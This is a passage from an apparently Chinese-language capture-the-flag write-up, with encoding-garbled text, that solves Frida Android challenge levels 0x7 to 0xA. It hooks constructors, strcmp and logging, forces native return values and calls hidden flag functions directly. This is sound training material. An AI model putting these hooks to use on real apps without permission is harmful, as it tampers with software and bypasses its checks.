class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>        &#125;;<br><br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.ad2001.frida0x7.MainActivity&#x27;</span>, &#123;<br><br>            <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br>              <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);<br>              <span class="hljs-keyword">var</span> checker  = <span class="hljs-title class_">Checker</span>.$new(<span class="hljs-number">600</span>,<span class="hljs-number">600</span>);<br>                instance.<span class="hljs-title function_">flag</span>(checker);<br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            &#125;<br>        &#125;);<br>    &#125;);<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/R1QUbcN7Oo8SXBxyj8VcUuuZn8f.png"></p><p>æ—¢ç„¶æ˜¯é€šè¿‡æ„é€ å‡½æ•°æ¥å®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–ï¼Œä¸å¦‚ç›´æ¥æ›´è¿‘ä¸€æ­¥ hook æ„é€ å‡½æ•°</p><p><code>$init</code> åœ¨ Frida ä¸­ç”¨æ¥è¡¨ç¤º Java ç±»çš„æ„é€ å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br>  <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>        <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>    &#125;;<br><br>  <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);<br>  <span class="hljs-title class_">Checker</span>.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">param</span>)&#123;<br>    <span class="hljs-variable language_">this</span>.$init(<span class="hljs-number">600</span>, <span class="hljs-number">600</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/img/TcXrboLDToB5YexWEfycZcl8nlh.png"></p><h1 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h1><p>è¿™æ¬¡ä¸»é€»è¾‘æ”¾åœ¨äº† native å±‚ï¼Œé€šè¿‡ <code>System.loadLibrary</code> åŠ è½½äº†ä¸€ä¸ª native å‡½æ•°</p><p><img src="/img/X290bRlioogi7pxScJycsaWRnWf.png"></p><p>é€šè¿‡æ¯”è¾ƒç”¨æˆ·è¾“å…¥çš„å€¼ s1 ä¸ s2 çš„ï¼Œè¿”å›ä¸€ä¸ª bool å€¼</p><p><img src="/img/LL91b7fcXoUIoLxUL0lcUBcfndQ.png"></p><p>s2 çš„ç”Ÿæˆé€»è¾‘</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-type">unsigned</span> __int64)__strlen_chk(<span class="hljs-string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="hljs-number">-1LL</span>); ++i )<br>    s2[i] = aGsjebObujwfMbo[i] - <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>aGsjebObujwfMbo æ•°ç»„çš„å†…å®¹ä¹Ÿæ˜¯ <code>GSJEB|OBUJWF</code> MBOE~&#96;</p><p><img src="/img/WCFrbDlC5oflbgxqVdkcXUzEnCc.png"></p><p>å¯¹æ¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ ascii å€¼å‡ä¸€å³å¯å¾—åˆ° flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = <span class="hljs-string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span><br><br>decrypted_str = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) - <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> enc])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, decrypted_str)<br></code></pre></td></tr></table></figure><p><img src="/img/QT2WbNxEooUWUqx4KDOcBGKyniI.png"></p><p>frida ä¹Ÿæ”¯æŒ native å±‚çš„ hook</p><p>å…ˆé€šè¿‡ frida è·å–æ‰€æœ‰å¯¼å‡ºå‡½æ•°ï¼Œè·å–å®Œæ•´çš„å‡½æ•°ç­¾å</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0x8.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> e = a[i];<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/KzKjbvTmfo57eKx3zcWcEX82nwc.png"></p><p>native å±‚ä¸­çš„ä¸»è¦é€»è¾‘æ˜¯è°ƒç”¨ <code>strcmp</code> å°†è¾“å…¥çš„å­—ç¬¦ä¸²å’Œ flag æ¯”è¾ƒï¼Œæ‰€ä»¥ç›´æ¥ hook <code>libc.so</code> ä¸­çš„ <code>strcmp</code> å‡½æ•°å°±èƒ½ç›´æ¥è·å–åˆ° flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libc.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-keyword">var</span> strcmpAddr = <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] strcmp address: &quot;</span> + strcmpAddr);<br><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(strcmpAddr, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-keyword">var</span> input = args[<span class="hljs-number">0</span>].<span class="hljs-title function_">readUtf8String</span>();    <span class="hljs-comment">//è½¬æ¢æˆutf8å­—ç¬¦ä¸²ä»¥å…æŠ¥é”™</span><br>            <span class="hljs-keyword">var</span> flag = args[<span class="hljs-number">1</span>].<span class="hljs-title function_">readUtf8String</span>();<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;    <span class="hljs-comment">//åªæœ‰ç‰¹å®šè¾“å…¥å€¼æ‰ä¼šæ‰“å° ä»¥å…å†—ä½™æ‰“å°</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] flag: &quot;</span> + flag);<br>            &#125;<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/AGegbPlSCoVv8ux8Ea6cU9uxndg.png"></p><h1 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h1><p>è¿™å…³åªæœ‰ä¸€ä¸ª onClick æ–¹æ³•æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥è¾“å…¥ä»»ä½•å†…å®¹ï¼Œä½†åªéœ€è¦æ§åˆ¶ native æ–¹æ³• check_flag çš„è¿”å›å€¼ä¸º 1337 å³å¯</p><p><img src="/img/OFaib17p6oWSeWxtOqEc5LD1nyf.png"></p><p>éå†å¯¼å‡ºè¡¨ï¼Œè¿™æ¬¡å°±éœ€è¦ç›´æ¥ hook APK é‡Œçš„ so æ–‡ä»¶é‡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;liba0x9.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> e = a[i];<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/O8wSb6CqwoXfO7xaxWicKd9gnHg.png"></p><p>è¿™æ¬¡ç”¨çš„æ˜¯ Toast å¼¹çª—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;liba0x9.so&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>        <span class="hljs-keyword">var</span> check_flag = <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] check_flag address: &quot;</span> + check_flag);<br><br>        <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(check_flag, &#123;<br>            <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><br>            &#125;,<br>            <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">1337</span>);<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] check_flag called, retval: &quot;</span> + <span class="hljs-number">1337</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Toast</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.Toast&quot;</span>);<br>        <span class="hljs-title class_">Toast</span>.<span class="hljs-property">makeText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;android.content.Context&#x27;</span>, <span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, text, duration</span>) &#123;<br>            <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Toast æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeText</span>(context, text, duration);<br>        &#125;;<br>    &#125;);<br><br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/Fun9bL1b9oFZjsxdsUZcDIiMnBg.png"></p><h1 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h1><p>åªæœ‰ä¸€ä¸ª onCreate æ–¹æ³•ï¼ŒsetText çš„å†…å®¹ç›´æ¥å°±æ¥è‡ª native æ–¹æ³•</p><p><img src="/img/OWKVbShuHoFl9vxPMsncu9i0nTf.png"></p><p><code>stringFromJNI</code> å‡½æ•°ä½œç”¨å°±æ˜¯æŠŠ <code>Hello Hackers</code> å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ï¼ˆå»ºè®®åç¼–è¯‘ x86 æ¶æ„çš„ so æ–‡ä»¶ï¼Œarm æ¶æ„åç¼–è¯‘ä¸å‡º <code>Hello Hackers</code> è¿™ä¸ªå­—ç¬¦ä¸²ï¼‰</p><p><img src="/img/Tjzcb1KE1oRez9x1sTOc0aaXnFg.png"></p><p>ä½†æ˜¯åœ¨ç¬¦å·è¡¨é‡Œé¢è¿˜æ²¡æœ‰è¢«è°ƒç”¨è¿‡çš„ <code>get_flag</code> æ–¹æ³•æ‰æ˜¯çœŸæ­£çš„ flag ç”Ÿæˆé€»è¾‘</p><p><img src="/img/UnYebC5W7osjhYxtBircQsElnDb.png"></p><p>è¿™ä¸ªç®—æ³•å¾ˆç®€å•å°±æ˜¯<strong>æ¯ä¸ªå­—ç¬¦çš„ ASCII å€¼åŠ ä¸Š 2 * i</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">encrypted = <span class="hljs-string">&quot;FPE&gt;9q8A&gt;BK-)20A-#Y&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(encrypted[i]) + <span class="hljs-number">2</span> * i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted)))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Decrypted flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><p><img src="/img/AMOJbsPOqoBWLqxKV9rcIvgtnVg.png"></p><p>frida ä¹Ÿæä¾›äº†å¯ä»¥ä¸»åŠ¨è°ƒç”¨ native æ–¹æ³•çš„ api</p><p>éå†å¯¼å‡ºè¡¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0xa.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> e = a[i];<br>        <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;get_flag&quot;</span>))&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>        &#125;<br>     &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] Module not found: &quot;</span> + moduleName);<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç° <code>get_flag </code> å˜æˆäº† <code>_Z8get_flagii</code>ï¼Œè¿™æ˜¯å› ä¸ºç¼–è¯‘å™¨éœ€è¦ä¸º C++ ä¸­çš„æ‰€æœ‰å‡½æ•°ï¼Œåœ¨ç¬¦å·è¡¨ä¸­ç”Ÿæˆå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œæ¥åŒºåˆ†ä¸åŒçš„å‡½æ•°ï¼Œæ‰€ä»¥ä¼šé‡å‘½åå‡½æ•°</p><p><img src="/img/XjOsbDfWioCWy2xr6q8cHkDinvg.png"></p><p>å› ä¸ºå‡½æ•°è¿˜æ˜¯æœ‰å¯¼å‡ºè¡¨çš„å¯ä»¥å¯ä»¥ç›´æ¥é€šè¿‡å‡½æ•°åè·å–åœ°å€åè°ƒç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0xa.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> e = a[i];<br>        <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;get_flag&quot;</span>))&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>            <span class="hljs-keyword">var</span> target = e.<span class="hljs-property">address</span>;<br>            <span class="hljs-keyword">var</span> get_flag_ptr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(target);<br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">My</span>_get_flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr, <span class="hljs-string">&#x27;char&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>            <span class="hljs-keyword">var</span> flag = <span class="hljs-title class_">My</span>_get_flag(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag);<br><br>        &#125;<br>     &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] Module not found: &quot;</span> + moduleName);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€å¥½æ‰“å° flag çš„ä½¿ç”¨ log æ‰“å°çš„æ‰€ä»¥å¾—ç”¨ logcat æŸ¥çœ‹</p><p><img src="/img/GpnHbEimzo1O27xR8wfcaLzgnDg.png"></p><p>æ—¥å¿—åˆ·æ–°å¾ˆå¿«ï¼Œä¸å®¹æ˜“çœ‹åˆ° flagï¼Œè¿ç”¨ä¸Šå…³çš„çŸ¥è¯† ç›´æ¥ hook <code>__android_log_print</code> å°† flag æ‰“å°åˆ°æ§åˆ¶å°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java">setTimeout(function() &#123;<br>    <span class="hljs-type">var</span> <span class="hljs-variable">loglib</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;liblog.so&quot;</span>;<br>    <span class="hljs-type">var</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> Process.findModuleByName(loglib);<br>    <span class="hljs-keyword">if</span> (log) &#123;<br>        console.log(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + log.name + <span class="hljs-string">&quot; at &quot;</span> + log.base);<br>        <span class="hljs-type">var</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span>  log.enumerateExports();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">var</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>            <span class="hljs-type">var</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> a[i];<br>            <span class="hljs-keyword">if</span> (e.name.includes(<span class="hljs-string">&quot;__android_log_print&quot;</span>))&#123;<br>                console.log(<span class="hljs-string">&quot;[*] &quot;</span> + e.name + <span class="hljs-string">&quot;: &quot;</span> + e.address);<br>            <span class="hljs-type">var</span> <span class="hljs-variable">logPrint</span> <span class="hljs-operator">=</span> e.address;<br>            Interceptor.attach(logPrint, &#123;<br>                onEnter: function(args) &#123;<br>                    <span class="hljs-type">var</span> <span class="hljs-variable">flagPtr</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">3</span>];<br>                    <span class="hljs-type">var</span> <span class="hljs-variable">flagValue</span> <span class="hljs-operator">=</span> flagPtr.readCString();<br>                    console.log(<span class="hljs-string">&quot;[*] flag: &quot;</span> + flagValue + <span class="hljs-string">&quot;\n&quot;</span>);<br>                &#125;<br>        &#125;);<br><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">var</span> <span class="hljs-variable">moduleName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;libfrida0xa.so&quot;</span>;<br>    <span class="hljs-type">var</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> Process.findModuleByName(moduleName);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">module</span>) &#123;<br>        console.log(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-keyword">module</span>.name + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-keyword">module</span>.base);<br>        <span class="hljs-type">var</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">module</span>.enumerateExports();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">var</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>            <span class="hljs-type">var</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> a[i];<br>            <span class="hljs-keyword">if</span> (e.name.includes(<span 